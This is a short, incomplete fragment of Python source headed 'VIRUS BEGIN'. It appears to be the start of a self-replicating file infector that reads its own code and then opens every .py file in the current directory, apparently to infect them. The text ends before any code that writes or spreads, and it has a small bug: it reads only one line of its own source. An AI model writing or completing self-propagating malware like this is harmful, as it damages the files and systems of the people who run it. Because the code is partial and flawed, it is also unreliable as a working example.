#### VIRUS BEGIN ####

import sys, glob, re

vCode = []
fh = open(sys.argv[0], "r")
vCode = fh.readline()

fh.close()


progs = glob.glob("*.py")

for prog in progs:
    fh = open(prog, "r")
    pCode = fh.readlines()
    fh.close()

